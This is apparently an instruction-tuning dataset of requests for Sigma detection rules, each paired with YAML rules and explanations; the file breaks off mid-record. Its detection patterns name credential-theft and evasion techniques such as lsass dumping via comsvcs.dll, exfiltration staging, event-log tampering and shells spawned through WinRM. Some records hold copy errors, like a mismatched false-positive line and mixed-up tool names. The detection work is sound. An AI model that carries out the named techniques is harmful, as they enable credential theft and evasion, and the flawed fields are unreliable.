[
  {
    "instruction": "Build a Sigma rule with the goal of detecting usage of the \"Set-Service\" powershell cmdlet to configure a new SecurityDescriptor that allows a service to be hidden from other utilities such as \"sc.exe\", \"Get-Service\"...etc. (Works only in powershell 7).\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect usage of the \"Set-Service\" PowerShell cmdlet to configure a new SecurityDescriptor that allows a service to be hidden from other utilities such as \"sc.exe\", \"Get-Service\"...etc. (Works only in PowerShell 7), you should:\n\nMonitor Windows PowerShell script execution logs, specifically looking for script execution that involves the \"Set-Service\" command. This command might be used maliciously to manipulate Windows services in a way that hides them from typical management tools like \"sc.exe\" and \"Get-Service\". The detection focus is on scripts that contain both the string 'Set-Service ' and the unique identifier 'DCLCWPDTSD', along with either the '-SecurityDescriptorSddl ' or '-sd ' strings. These elements indicate an attempt to alter the security descriptors of services, potentially to conceal malicious services. It's important to have Script Block Logging enabled to capture the necessary data for this analysis. However, be aware that there might be rare legitimate uses of such scripts or potential false positives due to the complexity of PowerShell script text analysis. The severity of this detection is classified as high due to the potential impact of hiding malicious services on a Windows system.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains|all:\n            - 'Set-Service '\n            - 'DCLCWPDTSD'\n        ScriptBlockText|contains:\n            - '-SecurityDescriptorSddl '\n            - '-sd '\n    condition: selection\nfalsepositives:\n    - Rare intended use of hidden services\n    - Rare FP could occur due to the non linearity of the ScriptBlockText log\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains|all:\n            - 'Set-Service '\n            - 'DCLCWPDTSD'\n        ScriptBlockText|contains:\n            - '-SecurityDescriptorSddl '\n            - '-sd '\n    condition: selection\nfalsepositives:\n    - Rare intended use of hidden services\n    - Rare FP could occur due to the non linearity of the ScriptBlockText log\nlevel: high\n",
      "question": "usage of the \"Set-Service\" powershell cmdlet to configure a new SecurityDescriptor that allows a service to be hidden from other utilities such as \"sc.exe\", \"Get-Service\"...etc. (Works only in powershell 7)",
      "answer": "In order to detect usage of the \"Set-Service\" PowerShell cmdlet to configure a new SecurityDescriptor that allows a service to be hidden from other utilities such as \"sc.exe\", \"Get-Service\"...etc. (Works only in PowerShell 7), you should:\n\nMonitor Windows PowerShell script execution logs, specifically looking for script execution that involves the \"Set-Service\" command. This command might be used maliciously to manipulate Windows services in a way that hides them from typical management tools like \"sc.exe\" and \"Get-Service\". The detection focus is on scripts that contain both the string 'Set-Service ' and the unique identifier 'DCLCWPDTSD', along with either the '-SecurityDescriptorSddl ' or '-sd ' strings. These elements indicate an attempt to alter the security descriptors of services, potentially to conceal malicious services. It's important to have Script Block Logging enabled to capture the necessary data for this analysis. However, be aware that there might be rare legitimate uses of such scripts or potential false positives due to the complexity of PowerShell script text analysis. The severity of this detection is classified as high due to the potential impact of hiding malicious services on a Windows system."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Use living off the land tools to zip a file and stage it in the Windows temporary folder for later exfiltration.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to use living off the land tools to zip a file and stage it in the Windows temporary folder for later exfiltration, you should monitor Windows PowerShell module logs for specific command-line patterns that indicate such activity. This involves tracking commands that utilize the 'Compress-Archive' function, a part of PowerShell used to create zip archives. Specifically, you should look for commands that include both the '-Path' and '-DestinationPath' parameters, indicating the source files to compress and the location where the compressed archive should be stored. It's critical to focus on commands that specify the destination path as the Windows temporary folder, denoted by `$env:TEMP\\`. This pattern of behavior is indicative of attackers leveraging built-in tools to compress potentially sensitive information before exfiltration, aligning with tactics and techniques such as Resource Development and Collection. While this detection strategy is important for identifying suspicious zipping activity, it's also advised to be aware of potential unknown false positives, given the legitimate use of 'Compress-Archive' in non-malicious contexts. The monitoring of these activities is categorized as medium level due to the possibility of both legitimate and malicious use cases.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_module\n    definition: 0ad03ef1-f21b-4a79-8ce8-e6900c54b65b\ndetection:\n    selection_4103:\n        ContextInfo|contains|all:\n            - 'Compress-Archive '\n            - ' -Path '\n            - ' -DestinationPath '\n            - '$env:TEMP\\'\n    condition: selection_4103\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_module\n    definition: 0ad03ef1-f21b-4a79-8ce8-e6900c54b65b\ndetection:\n    selection_4103:\n        ContextInfo|contains|all:\n            - 'Compress-Archive '\n            - ' -Path '\n            - ' -DestinationPath '\n            - '$env:TEMP\\'\n    condition: selection_4103\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "Use living off the land tools to zip a file and stage it in the Windows temporary folder for later exfiltration",
      "answer": "In order to use living off the land tools to zip a file and stage it in the Windows temporary folder for later exfiltration, you should monitor Windows PowerShell module logs for specific command-line patterns that indicate such activity. This involves tracking commands that utilize the 'Compress-Archive' function, a part of PowerShell used to create zip archives. Specifically, you should look for commands that include both the '-Path' and '-DestinationPath' parameters, indicating the source files to compress and the location where the compressed archive should be stored. It's critical to focus on commands that specify the destination path as the Windows temporary folder, denoted by `$env:TEMP\\`. This pattern of behavior is indicative of attackers leveraging built-in tools to compress potentially sensitive information before exfiltration, aligning with tactics and techniques such as Resource Development and Collection. While this detection strategy is important for identifying suspicious zipping activity, it's also advised to be aware of potential unknown false positives, given the legitimate use of 'Compress-Archive' in non-malicious contexts. The monitoring of these activities is categorized as medium level due to the possibility of both legitimate and malicious use cases."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Remote registry management using REG utility from non-admin workstation.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect instances of remote registry management using REG utility from non-admin workstations, you should focus on monitoring Windows security logs. Specifically, look for events with the Event ID 5145, which indicates an attempt to access network shared objects. This activity becomes particularly interesting when the accessed object is related to the Windows Registry, as denoted by the access path containing '\\winreg'. \n\nTo ensure that legitimate administrative activity does not generate unnecessary alerts, any access attempts made from known administrators' workstations should be excluded from this detection mechanism. This approach helps in identifying potentially malicious or unauthorized attempts to use the REG utility for registry modifications from machines that are not recognized as administrative workstations. \n\nBe aware that while monitoring for this behavior is crucial for detecting unauthorized remote registry management attempts, there could be instances where legitimate usage triggers an alert. Such legitimate cases typically involve administrators performing valid remote registry operations from non-standard workstations. \n\nThe primary focus on security event logs, combined with the specific conditions around Event ID 5145 and the exclusion of known admin workstations, aligns this detection strategy with tactics and techniques associated with Persistence, Privilege Escalation, and Defense Evasion. Identifying unauthorized access to the Windows Registry via remote management tools is a critical step in mitigating potential threats that exploit registry modifications for malicious purposes.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 5145\n        RelativeTargetName|contains: '\\winreg'\n    filter_main:\n        IpAddress: '%Admins_Workstations%'\n    condition: selection and not filter_main\nfalsepositives:\n    - Legitimate usage of remote registry management by administrator\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 5145\n        RelativeTargetName|contains: '\\winreg'\n    filter_main:\n        IpAddress: '%Admins_Workstations%'\n    condition: selection and not filter_main\nfalsepositives:\n    - Legitimate usage of remote registry management by administrator\nlevel: medium\n",
      "question": "Remote registry management using REG utility from non-admin workstation",
      "answer": "In order to detect instances of remote registry management using REG utility from non-admin workstations, you should focus on monitoring Windows security logs. Specifically, look for events with the Event ID 5145, which indicates an attempt to access network shared objects. This activity becomes particularly interesting when the accessed object is related to the Windows Registry, as denoted by the access path containing '\\winreg'. \n\nTo ensure that legitimate administrative activity does not generate unnecessary alerts, any access attempts made from known administrators' workstations should be excluded from this detection mechanism. This approach helps in identifying potentially malicious or unauthorized attempts to use the REG utility for registry modifications from machines that are not recognized as administrative workstations. \n\nBe aware that while monitoring for this behavior is crucial for detecting unauthorized remote registry management attempts, there could be instances where legitimate usage triggers an alert. Such legitimate cases typically involve administrators performing valid remote registry operations from non-standard workstations. \n\nThe primary focus on security event logs, combined with the specific conditions around Event ID 5145 and the exclusion of known admin workstations, aligns this detection strategy with tactics and techniques associated with Persistence, Privilege Escalation, and Defense Evasion. Identifying unauthorized access to the Windows Registry via remote management tools is a critical step in mitigating potential threats that exploit registry modifications for malicious purposes."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Get-Process command on lsass process, which is in almost all cases a sign of malicious activity.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect a Get-Process command on lsass process, which is in almost all cases a sign of malicious activity, you should: Focus on monitoring PowerShell script activities within a Windows environment, particularly those that involve script block execution. Ensure that Script Block Logging is enabled to capture detailed logging information. Specifically, pay attention to any instance where the PowerShell command `Get-Process lsass` is executed. This command is known for its potential use in malicious activities, particularly because the Local Security Authority Subsystem Service (lsass) process is a common target for attackers seeking to extract sensitive information like passwords from the system memory. Be aware of false positives, which may include legitimate uses of the `Get-Process` command by administrators or users within your environment. These should be filtered out based on the context and necessity of the command usage in your specific setting. The detection of this activity is considered high level due to the critical nature of accessing the lsass process and the potential implications of such actions.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains: 'Get-Process lsass'\n    condition: selection\nfalsepositives:\n    - Legitimate certificate exports invoked by administrators or users (depends on processes in the environment - filter if unusable)\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains: 'Get-Process lsass'\n    condition: selection\nfalsepositives:\n    - Legitimate certificate exports invoked by administrators or users (depends on processes in the environment - filter if unusable)\nlevel: high\n",
      "question": "Get-Process command on lsass process, which is in almost all cases a sign of malicious activity",
      "answer": "In order to detect a Get-Process command on lsass process, which is in almost all cases a sign of malicious activity, you should: Focus on monitoring PowerShell script activities within a Windows environment, particularly those that involve script block execution. Ensure that Script Block Logging is enabled to capture detailed logging information. Specifically, pay attention to any instance where the PowerShell command `Get-Process lsass` is executed. This command is known for its potential use in malicious activities, particularly because the Local Security Authority Subsystem Service (lsass) process is a common target for attackers seeking to extract sensitive information like passwords from the system memory. Be aware of false positives, which may include legitimate uses of the `Get-Process` command by administrators or users within your environment. These should be filtered out based on the context and necessity of the command usage in your specific setting. The detection of this activity is considered high level due to the critical nature of accessing the lsass process and the potential implications of such actions."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting adversaries leveraging the MiniDump export function from comsvcs.dll via rundll32 to perform a memory dump from lsass..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect adversaries leveraging the MiniDump export function from comsvcs.dll via rundll32 to perform a memory dump from lsass, you should: This detection focuses on monitoring process access within Windows environments. It specifically identifies instances when the lsass.exe (Local Security Authority Subsystem Service) process is accessed by the rundll32.exe utility. The rule triggers an alert if the lsass.exe process is being targeted and the source of this activity is rundll32.exe, especially when this activity involves the use of the comsvcs.dll, which is known to be used for memory dumping functions. This behavior is indicative of an attack aiming to extract sensitive information from the memory of the lsass process, which manages user logins and password changes, making it a prime target for attackers seeking to steal credentials. The critical nature of this alert underscores the importance of promptly investigating such detections to mitigate potential security breaches.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_access\n    product: windows\ndetection:\n    selection:\n        TargetImage|endswith: '\\lsass.exe'\n        SourceImage: 'C:\\Windows\\System32\\rundll32.exe'\n        CallTrace|contains: 'comsvcs.dll'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_access\n    product: windows\ndetection:\n    selection:\n        TargetImage|endswith: '\\lsass.exe'\n        SourceImage: 'C:\\Windows\\System32\\rundll32.exe'\n        CallTrace|contains: 'comsvcs.dll'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: critical\n",
      "question": "adversaries leveraging the MiniDump export function from comsvcs.dll via rundll32 to perform a memory dump from lsass.",
      "answer": "In order to detect adversaries leveraging the MiniDump export function from comsvcs.dll via rundll32 to perform a memory dump from lsass, you should: This detection focuses on monitoring process access within Windows environments. It specifically identifies instances when the lsass.exe (Local Security Authority Subsystem Service) process is accessed by the rundll32.exe utility. The rule triggers an alert if the lsass.exe process is being targeted and the source of this activity is rundll32.exe, especially when this activity involves the use of the comsvcs.dll, which is known to be used for memory dumping functions. This behavior is indicative of an attack aiming to extract sensitive information from the memory of the lsass process, which manages user logins and password changes, making it a prime target for attackers seeking to steal credentials. The critical nature of this alert underscores the importance of promptly investigating such detections to mitigate potential security breaches."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Winword starting uncommon sub process FLTLDR.exe as used in exploits for CVE-2017-0261 and CVE-2017-0262.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect Winword starting an uncommon subprocess FLTLDR.exe as used in exploits for CVE-2017-0261 and CVE-2017-0262, you should: monitor process creation events on Windows systems for instances where the parent process is 'WINWORD.EXE' and it initiates a subprocess named 'FLTLDR.exe'. Be aware that there could be several false positives, especially from suspicious file names or locations such as temporary folders. This detection process is associated with a medium level of importance.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\WINWORD.EXE'\n        Image|contains: '\\FLTLDR.exe'\n    condition: selection\nfalsepositives:\n    - Several false positives identified, check for suspicious file names or locations (e.g. Temp folders)\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\WINWORD.EXE'\n        Image|contains: '\\FLTLDR.exe'\n    condition: selection\nfalsepositives:\n    - Several false positives identified, check for suspicious file names or locations (e.g. Temp folders)\nlevel: medium\n",
      "question": "Winword starting uncommon sub process FLTLDR.exe as used in exploits for CVE-2017-0261 and CVE-2017-0262",
      "answer": "In order to detect Winword starting an uncommon subprocess FLTLDR.exe as used in exploits for CVE-2017-0261 and CVE-2017-0262, you should: monitor process creation events on Windows systems for instances where the parent process is 'WINWORD.EXE' and it initiates a subprocess named 'FLTLDR.exe'. Be aware that there could be several false positives, especially from suspicious file names or locations such as temporary folders. This detection process is associated with a medium level of importance."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Detection use of the command \"split\" to split files into parts and possible transfer..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the use of the command \"split\" to split files into parts and possible transfer, you should monitor process creation logs on macOS systems for any instances where the command ending with '/split' is executed. It's important to note that this activity might sometimes be related to legitimate administrative tasks, so the risk level associated with this detection is considered low. This monitoring aims to identify scenarios where an attacker may be splitting files, potentially as a precursor to exfiltrating data.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: macos\n    category: process_creation\ndetection:\n    selection:\n        Image|endswith: '/split'\n    condition: selection\nfalsepositives:\n    - Legitimate administrative activity\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: macos\n    category: process_creation\ndetection:\n    selection:\n        Image|endswith: '/split'\n    condition: selection\nfalsepositives:\n    - Legitimate administrative activity\nlevel: low\n",
      "question": "Detection use of the command \"split\" to split files into parts and possible transfer.",
      "answer": "In order to detect the use of the command \"split\" to split files into parts and possible transfer, you should monitor process creation logs on macOS systems for any instances where the command ending with '/split' is executed. It's important to note that this activity might sometimes be related to legitimate administrative tasks, so the risk level associated with this detection is considered low. This monitoring aims to identify scenarios where an attacker may be splitting files, potentially as a precursor to exfiltrating data."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious user agent strings used by crypto miners in proxy logs.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious user agent strings used by crypto miners in proxy logs, you should: Look into the proxy log sources for user agents beginning with specific patterns indicative of crypto-mining software. Focus on identifying any user agents that start with \"XMRig \" or \"ccminer\" as these are commonly associated with crypto mining activities. Ensure to meticulously collect data fields such as ClientIP, requested URI (c-uri), and the complete user agent string (c-useragent) for further analysis. It's important to be aware of the potential for unknown false positives, but given the high level of scrutiny required for such detections, the risk is deemed high. This method is tied to monitoring techniques and behaviors that relate to the use of system resources for unauthorized cryptocurrency mining.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: proxy\ndetection:\n    selection:\n        c-useragent|startswith:\n        # XMRig\n            - 'XMRig '\n        # CCMiner\n            - 'ccminer'\n    condition: selection\nfields:\n    - ClientIP\n    - c-uri\n    - c-useragent\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: proxy\ndetection:\n    selection:\n        c-useragent|startswith:\n        # XMRig\n            - 'XMRig '\n        # CCMiner\n            - 'ccminer'\n    condition: selection\nfields:\n    - ClientIP\n    - c-uri\n    - c-useragent\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "suspicious user agent strings used by crypto miners in proxy logs",
      "answer": "In order to detect suspicious user agent strings used by crypto miners in proxy logs, you should: Look into the proxy log sources for user agents beginning with specific patterns indicative of crypto-mining software. Focus on identifying any user agents that start with \"XMRig \" or \"ccminer\" as these are commonly associated with crypto mining activities. Ensure to meticulously collect data fields such as ClientIP, requested URI (c-uri), and the complete user agent string (c-useragent) for further analysis. It's important to be aware of the potential for unknown false positives, but given the high level of scrutiny required for such detections, the risk is deemed high. This method is tied to monitoring techniques and behaviors that relate to the use of system resources for unauthorized cryptocurrency mining."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Once executed, colorcpl.exe will copy the arbitrary file to c:\\windows\\system32\\spool\\drivers\\color\\.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect an instance where the colorcpl.exe application is used to copy an arbitrary file to the c:\\windows\\system32\\spool\\drivers\\color\\ directory, you should monitor file event logs on Windows systems. Specifically, look for events where the 'Image' field ends with '\\colorcpl.exe', indicating the colorcpl.exe application is executing. However, it is crucial to exclude events where the target filename ends with specific extensions: '.icm', '.gmmp', '.cdmp', or '.camp'. These exclusions help reduce false positive alerts. Events that match the execution criteria without falling into the filtered extension categories should be treated with a high level of suspicion. This monitoring strategy is essential for identifying potential misuse of the colorcpl.exe application in the scenario described.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: file_event\ndetection:\n    selection:\n        Image|endswith: '\\colorcpl.exe'\n    filter_ext:\n        TargetFilename|endswith:\n            - '.icm'\n            - '.gmmp'\n            - '.cdmp'\n            - '.camp'\n    condition: selection and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: file_event\ndetection:\n    selection:\n        Image|endswith: '\\colorcpl.exe'\n    filter_ext:\n        TargetFilename|endswith:\n            - '.icm'\n            - '.gmmp'\n            - '.cdmp'\n            - '.camp'\n    condition: selection and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "Once executed, colorcpl.exe will copy the arbitrary file to c:\\windows\\system32\\spool\\drivers\\color\\",
      "answer": "In order to detect an instance where the colorcpl.exe application is used to copy an arbitrary file to the c:\\windows\\system32\\spool\\drivers\\color\\ directory, you should monitor file event logs on Windows systems. Specifically, look for events where the 'Image' field ends with '\\colorcpl.exe', indicating the colorcpl.exe application is executing. However, it is crucial to exclude events where the target filename ends with specific extensions: '.icm', '.gmmp', '.cdmp', or '.camp'. These exclusions help reduce false positive alerts. Events that match the execution criteria without falling into the filtered extension categories should be treated with a high level of suspicion. This monitoring strategy is essential for identifying potential misuse of the colorcpl.exe application in the scenario described."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting use of SharpEvtHook, a tool that tampers with the Windows event logs.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the use of SharpEvtHook, a tool that tampers with the Windows event logs, you should: Focus on monitoring process creation events within Windows. Specifically, look for any processes where the image name ends with '\\SharpEvtMute.exe' or the description directly mentions 'SharpEvtMute'. Additionally, pay close attention to command line arguments that include phrases like '--Filter \"rule ' or '--Encoded --Filter \\\"', as these are indicative of attempts to manipulate or filter Windows event logs using SharpEvtMute. This analysis is considered to have a high level of importance due to the potential misuse of SharpEvtMute in evading detection or altering logs to hide malicious activity. Keep in mind, though, the possibility of false positives is unknown, indicating the necessity for manual verification of detections. This approach aligns with tactics and techniques often employed by attackers to evade detection, specifically those relating to the manipulation of system logging processes.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        - Image|endswith: '\\SharpEvtMute.exe'\n        - Description: 'SharpEvtMute'\n        - CommandLine|contains:\n            - '--Filter \"rule '\n            - '--Encoded --Filter \\\"'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        - Image|endswith: '\\SharpEvtMute.exe'\n        - Description: 'SharpEvtMute'\n        - CommandLine|contains:\n            - '--Filter \"rule '\n            - '--Encoded --Filter \\\"'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "use of SharpEvtHook, a tool that tampers with the Windows event logs",
      "answer": "In order to detect the use of SharpEvtHook, a tool that tampers with the Windows event logs, you should: Focus on monitoring process creation events within Windows. Specifically, look for any processes where the image name ends with '\\SharpEvtMute.exe' or the description directly mentions 'SharpEvtMute'. Additionally, pay close attention to command line arguments that include phrases like '--Filter \"rule ' or '--Encoded --Filter \\\"', as these are indicative of attempts to manipulate or filter Windows event logs using SharpEvtMute. This analysis is considered to have a high level of importance due to the potential misuse of SharpEvtMute in evading detection or altering logs to hide malicious activity. Keep in mind, though, the possibility of false positives is unknown, indicating the necessity for manual verification of detections. This approach aligns with tactics and techniques often employed by attackers to evade detection, specifically those relating to the manipulation of system logging processes."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Host Without Firewall. Alert means not complied. Sigma for Qualys vulnerability scanner. Scan type - Vulnerability Management..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect a host without a firewall and thus not compliant with security policies, as indicated by scans from Qualys focusing on Vulnerability Management, you should: Monitor the logs from Qualys for events categorized under 'Security Policy'. Specifically, look for entries where the vulnerability name indicates that a 'Firewall Product Not Detected' on the host. This detection signals that the host may be vulnerable due to the absence of a firewall, aligning with vulnerability management practices. It is flagged with a low level of severity, reflecting its nature as a basic, yet crucial, compliance check.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: qualys\ndetection:\n    selection:\n        event.category: 'Security Policy'\n        host.scan.vuln_name|contains: 'Firewall Product Not Detected'\n    condition: selection\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: qualys\ndetection:\n    selection:\n        event.category: 'Security Policy'\n        host.scan.vuln_name|contains: 'Firewall Product Not Detected'\n    condition: selection\nlevel: low\n",
      "question": "Host Without Firewall. Alert means not complied. Sigma for Qualys vulnerability scanner. Scan type - Vulnerability Management.",
      "answer": "In order to detect a host without a firewall and thus not compliant with security policies, as indicated by scans from Qualys focusing on Vulnerability Management, you should: Monitor the logs from Qualys for events categorized under 'Security Policy'. Specifically, look for entries where the vulnerability name indicates that a 'Firewall Product Not Detected' on the host. This detection signals that the host may be vulnerable due to the absence of a firewall, aligning with vulnerability management practices. It is flagged with a low level of severity, reflecting its nature as a basic, yet crucial, compliance check."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Identifies when an ElastiCache security group has been modified or deleted..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to identify when an ElastiCache security group has been modified or deleted, you should monitor CloudTrail logs for AWS services for specific activities. Look for events sourced from elasticache.amazonaws.com that indicate modifications to Elasticache security groups. These events include 'DeleteCacheSecurityGroup', which signifies the deletion of a security group; 'AuthorizeCacheSecurityGroupIngress' and 'RevokeCacheSecurityGroupIngress', which pertain to the authorization or revocation of ingress rules; and 'AuthorizeCacheSecurityGroupEgress' and 'RevokeCacheSecurityGroupEgress', relevant to the authorization or revocation of egress rules. It is important to note that not all modifications may be unauthorized or malicious. Sometimes, system or network administrators may perform legitimate modifications. Therefore, it is advisable to verify the identity of the user making the changes, as well as the user agent and/or hostname, to ensure they are recognized entities within your environment. Modifications from unfamiliar users or hosts should be subjected to further investigation. Known behaviors that repeatedly trigger false positives can be exempted from monitoring to refine the detection process. This practice maintains a focus on identifying potentially malicious activities surrounding ElastiCache security groups while minimizing noise from legitimate administrative actions.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: aws\n    service: cloudtrail\ndetection:\n    selection:\n        eventSource: elasticache.amazonaws.com\n        eventName:\n            - 'DeleteCacheSecurityGroup'\n            - 'AuthorizeCacheSecurityGroupIngress'\n            - 'RevokeCacheSecurityGroupIngress'\n            - 'AuthorizeCacheSecurityGroupEgress'\n            - 'RevokeCacheSecurityGroupEgress'\n    condition: selection\nfalsepositives:\n    - A ElastiCache security group deletion may be done by a system or network administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. Security Group deletions from unfamiliar users or hosts should be investigated. If known behavior is causing false positives, it can be exempted from the rule.\n\n\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: aws\n    service: cloudtrail\ndetection:\n    selection:\n        eventSource: elasticache.amazonaws.com\n        eventName:\n            - 'DeleteCacheSecurityGroup'\n            - 'AuthorizeCacheSecurityGroupIngress'\n            - 'RevokeCacheSecurityGroupIngress'\n            - 'AuthorizeCacheSecurityGroupEgress'\n            - 'RevokeCacheSecurityGroupEgress'\n    condition: selection\nfalsepositives:\n    - A ElastiCache security group deletion may be done by a system or network administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. Security Group deletions from unfamiliar users or hosts should be investigated. If known behavior is causing false positives, it can be exempted from the rule.\n\n\nlevel: low\n",
      "question": "Identifies when an ElastiCache security group has been modified or deleted.",
      "answer": "In order to identify when an ElastiCache security group has been modified or deleted, you should monitor CloudTrail logs for AWS services for specific activities. Look for events sourced from elasticache.amazonaws.com that indicate modifications to Elasticache security groups. These events include 'DeleteCacheSecurityGroup', which signifies the deletion of a security group; 'AuthorizeCacheSecurityGroupIngress' and 'RevokeCacheSecurityGroupIngress', which pertain to the authorization or revocation of ingress rules; and 'AuthorizeCacheSecurityGroupEgress' and 'RevokeCacheSecurityGroupEgress', relevant to the authorization or revocation of egress rules. It is important to note that not all modifications may be unauthorized or malicious. Sometimes, system or network administrators may perform legitimate modifications. Therefore, it is advisable to verify the identity of the user making the changes, as well as the user agent and/or hostname, to ensure they are recognized entities within your environment. Modifications from unfamiliar users or hosts should be subjected to further investigation. Known behaviors that repeatedly trigger false positives can be exempted from monitoring to refine the detection process. This practice maintains a focus on identifying potentially malicious activities surrounding ElastiCache security groups while minimizing noise from legitimate administrative actions."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious processes including shells spawnd from WinRM host process.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious processes including shells spawned from WinRM host process, you should: Identify the creation of processes on Windows systems with a focus on instances where certain command-line tools or shells (such as cmd.exe, sh.exe, bash.exe, powershell.exe, pwsh.exe, wsl.exe, schtasks.exe, certutil.exe, whoami.exe, or bitsadmin.exe) are initiated from a parent process named wsmprovhost.exe. This activity is significant as it might indicate an attacker leveraging Windows Remote Management (WinRM) to execute commands or scripts remotely, which can be a part of various attack tactics like execution, privilege escalation, or lateral movement. It is crucial, however, to consider that not all matches will indicate malicious activity; legitimate administrative use of WinRM which includes similar process creation patterns could be erroneously detected, thus, being mindful of potential legitimate uses of WinRM in the environment is essential. The rule carries a high level of importance due to the severity of the underlying behavior it aims to detect.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\wsmprovhost.exe'\n        Image|endswith:\n            - '\\cmd.exe'\n            - '\\sh.exe'\n            - '\\bash.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\wsl.exe'\n            - '\\schtasks.exe'\n            - '\\certutil.exe'\n            - '\\whoami.exe'\n            - '\\bitsadmin.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate WinRM usage\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
